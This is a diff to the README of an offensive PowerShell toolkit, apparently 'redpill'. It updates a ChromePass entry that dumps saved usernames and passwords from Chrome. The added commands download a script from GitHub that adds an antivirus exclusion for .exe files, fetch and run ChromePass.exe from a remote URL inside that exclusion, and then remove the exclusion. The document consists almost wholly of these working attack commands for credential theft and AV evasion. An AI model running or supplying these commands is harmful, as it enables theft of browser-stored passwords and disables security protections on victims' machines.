@@ -49,12 +49,16 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|ChromePass|dumps URLs, usernames, and passwords from chrome|Administrator|ChromePass.ps1 downloads\evade AV|
+|ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-ExclusionExtension.ps1 downloads\evade AV|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1" -OutFile "ChromePass.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/BypassAV/Invoke-ExclusionExtension.ps1" -OutFile "Invoke-ExclusionExtension.ps1"
 ```
 
 ```powershell
-.\ChromePass.ps1
+Get-help .\Invoke-ExclusionExtension.ps1 -Force
+
+.\Invoke-ExclusionExtension.ps1 -action 'add' -Extension 'exe' -Directory '#Env:TMP'
+.\Invoke-ExclusionExtension.ps1 -action 'exe' -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe' -Extension 'exe'
+.\Invoke-ExclusionExtension.ps1 -action 'del' -Extension 'exe'
 ```
